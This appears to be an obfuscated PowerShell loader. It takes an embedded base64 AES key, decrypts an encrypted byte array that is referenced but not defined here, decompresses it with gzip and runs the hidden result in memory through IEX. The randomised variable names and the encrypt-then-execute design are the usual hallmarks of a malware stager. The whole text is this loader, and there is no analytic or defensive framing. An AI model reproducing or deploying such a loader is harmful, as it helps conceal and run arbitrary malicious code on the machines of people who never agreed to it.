$keesrkayx = [System.Convert]::FromBase64String("jqRjYAcxxHN5s3693XhF2NL9x+DTSEmYVaHLn75iAnQ=")
$frferkguy = New-Object "System.Security.Cryptography.AesManaged"
$frferkguy.KeySize = 128
$frferkguy.Key = $keesrkayx
$frferkguy.Mode = [System.Security.Cryptography.CipherMode]::ECB
$frferkguy.BlockSize = 128
$frferkguy.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$frferkguy.IV = $vizehht[0..15]
$pzfkthb = New-Object System.IO.MemoryStream(,$frferkguy.CreateDecryptor().TransformFinalBlock($vizehht,16,$vizehht.Length-16))
$tordebz = New-Object System.IO.MemoryStream
$rscedxi = New-Object System.IO.Compression.GzipStream $pzfkthb, ([IO.Compression.CompressionMode]::Decompress)
$rscedxi.CopyTo($tordebz)
$frferkguy.Dispose()
$hduaxh = [System.Text.Encoding]::UTF8.GetString($tordebz.ToArray())
$rscedxi.Close()
$pzfkthb.Close()
IEX($hduaxh)